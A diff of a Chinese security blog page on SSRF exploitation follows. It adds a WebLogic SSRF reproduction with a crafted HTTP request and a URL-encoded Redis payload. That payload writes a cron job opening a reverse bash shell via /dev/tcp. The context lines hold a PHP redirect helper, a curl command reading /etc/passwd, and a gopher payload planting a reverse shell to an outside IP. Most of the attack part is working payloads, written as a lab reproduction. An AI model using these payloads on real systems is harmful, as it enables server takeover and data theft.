@@ -65,10 +65,17 @@
 <meta property="og:url" content="http://uknowsec.cn/posts/notes/SSRF漏洞的利用与学习.html">
 <meta property="og:site_name" content="Uknow’s Blog">
 <meta property="og:description" content="点击阅读全文">
-<meta property="og:updated_time" content="2017-07-17T06:52:55.457Z">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/w-ssrf.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/w-ssrf1.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/w-ssrf2.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/w-ssrf3.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/w-ssrf5.png">
+<meta property="og:image" content="https://github.com/phith0n/vulhub/raw/master/weblogic/ssrf/5.png">
+<meta property="og:updated_time" content="2017-07-18T05:27:04.811Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SSRF漏洞的利用与学习">
 <meta name="twitter:description" content="点击阅读全文">
+<meta name="twitter:image" content="http://obr4sfdq7.bkt.clouddn.com/w-ssrf.png">
 
 
 
@@ -340,7 +347,28 @@ var _hmt = _hmt || [];
 <p>那么我们可以通过HTTP(S)的链接302跳转到gopher协议上。</p>
 <p>我们继续构造一个302跳转服务，代码如下302.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$schema = $_GET[&apos;s&apos;];</div><div class="line">$ip     = $_GET[&apos;i&apos;];</div><div class="line">$port   = $_GET[&apos;p&apos;];</div><div class="line">$query  = $_GET[&apos;q&apos;];</div><div class="line">if(empty($port))&#123;  </div><div class="line">    header(&quot;Location: $schema://$ip/$query&quot;); </div><div class="line">&#125; else &#123;</div><div class="line">    header(&quot;Location: $schema://$ip:$port/$query&quot;); </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
 <h4 id="利用测试"><a href="#利用测试" class="headerlink" title="利用测试"></a>利用测试</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"># dict protocol - 探测Redis</div><div class="line">dict://127.0.0.1:6379/info  </div><div class="line">curl -vvv &apos;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&amp;i=127.0.0.1&amp;port=6379&amp;query=info&apos;</div><div class="line"></div><div class="line"># file protocol - 任意文件读取</div><div class="line">curl -vvv &apos;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file&amp;query=/etc/passwd&apos;</div><div class="line"></div><div class="line"># gopher protocol - 一键反弹Bash</div><div class="line"># * 注意: gopher跳转的时候转义和`url`入参的方式有些区别</div><div class="line">curl -vvv &apos;http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher&amp;i=127.0.0.1&amp;p=6389&amp;query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0  </div><div class="line">a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/103.21.140.84/6789%200&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d  </div><div class="line">%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3</div><div class="line">%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&apos;</div></pre></td></tr></table></figure>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://joychou.org/index.php/web/phpssrf.html" target="_blank" rel="external">SSRF in PHP</a><br><a href="http://blog.feei.cn/ssrf/" target="_blank" rel="external">SSRF to GET SHELL</a><br><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="external">利用 gopher 协议拓展攻击面</a></p>
+<h2 id="Weblogic-SSRF漏洞复现"><a href="#Weblogic-SSRF漏洞复现" class="headerlink" title="Weblogic SSRF漏洞复现"></a>Weblogic SSRF漏洞复现</h2><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>SSRF漏洞存在于<a href="http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp页面的数据包中的operator参数，这个参数可以发送任意的HTTP请求" target="_blank" rel="external">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp页面的数据包中的operator参数，这个参数可以发送任意的HTTP请求</a></p>
+<h3 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h3><h4 id="探查服务端口"><a href="#探查服务端口" class="headerlink" title="探查服务端口"></a>探查服务端口</h4><p>在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如<a href="http://127.0.0.1:7001" target="_blank" rel="external">http://127.0.0.1:7001</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1</div><div class="line">Host: http://127.0.0.1:7001</div><div class="line">Content-Length: 133</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://127.0.0.1:7001</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Referer: http://115.159.4.50:7001/uddiexplorer/SearchPublicRegistries.jsp</div><div class="line">Accept-Language: zh-CN,zh;q=0.8</div><div class="line">Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; JSESSIONID=CZBhZtjHKR2mvqmnyBbVchhHvJ1KJ48lq4rq84pZnpFL2hkXrnhc!1235713544</div><div class="line">Connection: close</div><div class="line"></div><div class="line">operator=http://127.0.0.1:7001&amp;rdoSearch=name&amp;txtSearchname=1&amp;txtSearchkey=1&amp;txtSearchfor=1&amp;selfor=Business+location&amp;btnSubmit=Search</div></pre></td></tr></table></figure></p>
+<p>返回以下信息，说明存在7001端口的服务器<br><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf.png" alt=""></p>
+<p>访问一个不存在的IP，返回以下信息，返回 but could not connect over HTTP to server<br><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf1.png" alt=""></p>
+<p>访问一个非HTTP（dict）协议，返回以下信息，返回unknown protocol: dict<br><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf2.png" alt=""></p>
+<h4 id="注入HTTP头，利用Redis反弹shell"><a href="#注入HTTP头，利用Redis反弹shell" class="headerlink" title="注入HTTP头，利用Redis反弹shell"></a>注入HTTP头，利用Redis反弹shell</h4><p>通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现172.18.0.2:6379可以连通<br>返回<br>which did not have a valid SOAP content-type: null<br>说明存在redis服务</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf3.png" alt=""></p>
+<p>发送三条redis命令，将弹shell脚本写入/etc/crontab：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\n\n\n\n&quot;</div><div class="line">config set dir /etc/</div><div class="line">config set dbfilename crontab</div><div class="line">save</div></pre></td></tr></table></figure>
+<p>进行url编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</div></pre></td></tr></table></figure></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf5.png" alt=""></p>
+<p>反弹shell（自己测试没有成功的反弹，附上p牛的图吧）</p>
+<p><img src="https://github.com/phith0n/vulhub/raw/master/weblogic/ssrf/5.png" alt=""></p>
+<p>最后补充一下，可进行利用的cron有如下几个地方：</p>
+<ul>
+<li>/etc/crontab 这个是肯定的</li>
+<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
+<li>/var/spool/cron/root centos系统下root用户的cron文件</li>
+<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
+</ul>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://joychou.org/index.php/web/phpssrf.html" target="_blank" rel="external">SSRF in PHP</a><br><a href="http://blog.feei.cn/ssrf/" target="_blank" rel="external">SSRF to GET SHELL</a><br><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="external">利用 gopher 协议拓展攻击面</a><br><a href="https://github.com/phith0n/vulhub/tree/master/weblogic/ssrf" target="_blank" rel="external">vulhub/weblogic/ssrf</a></p>
 
       
     </div>
@@ -365,6 +393,10 @@ var _hmt = _hmt || [];
           </div>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/posts/uncategorized/XML实体注入漏洞的利用与学习.html" rel="prev" title="XML实体注入漏洞的利用与学习">
+                XML实体注入漏洞的利用与学习 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -459,7 +491,7 @@ var _hmt = _hmt || [];
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">43</span>
+              <span class="site-state-item-count">44</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -536,7 +568,7 @@ var _hmt = _hmt || [];
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞简介"><span class="nav-number">1.</span> <span class="nav-text">漏洞简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#本地利用"><span class="nav-number">2.1.</span> <span class="nav-text">本地利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#本地利用姿势"><span class="nav-number">2.1.1.</span> <span class="nav-text">本地利用姿势</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程利用"><span class="nav-number">2.2.</span> <span class="nav-text">远程利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞代码ssrf-php（未做任何SSRF防御）"><span class="nav-number">2.2.1.</span> <span class="nav-text">漏洞代码ssrf.php（未做任何SSRF防御）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#远程利用方式"><span class="nav-number">2.2.2.</span> <span class="nav-text">远程利用方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞代码ssrf2-php"><span class="nav-number">2.2.3.</span> <span class="nav-text">漏洞代码ssrf2.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#远程利用方式-1"><span class="nav-number">2.2.4.</span> <span class="nav-text">远程利用方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用测试"><span class="nav-number">2.2.5.</span> <span class="nav-text">利用测试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference"><span class="nav-number">3.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞简介"><span class="nav-number">1.</span> <span class="nav-text">漏洞简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#本地利用"><span class="nav-number">2.1.</span> <span class="nav-text">本地利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#本地利用姿势"><span class="nav-number">2.1.1.</span> <span class="nav-text">本地利用姿势</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程利用"><span class="nav-number">2.2.</span> <span class="nav-text">远程利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞代码ssrf-php（未做任何SSRF防御）"><span class="nav-number">2.2.1.</span> <span class="nav-text">漏洞代码ssrf.php（未做任何SSRF防御）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#远程利用方式"><span class="nav-number">2.2.2.</span> <span class="nav-text">远程利用方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞代码ssrf2-php"><span class="nav-number">2.2.3.</span> <span class="nav-text">漏洞代码ssrf2.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#远程利用方式-1"><span class="nav-number">2.2.4.</span> <span class="nav-text">远程利用方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用测试"><span class="nav-number">2.2.5.</span> <span class="nav-text">利用测试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Weblogic-SSRF漏洞复现"><span class="nav-number">3.</span> <span class="nav-text">Weblogic SSRF漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用姿势"><span class="nav-number">3.2.</span> <span class="nav-text">利用姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#探查服务端口"><span class="nav-number">3.2.1.</span> <span class="nav-text">探查服务端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注入HTTP头，利用Redis反弹shell"><span class="nav-number">3.2.2.</span> <span class="nav-text">注入HTTP头，利用Redis反弹shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol></div>
             
           </div>
         </section>
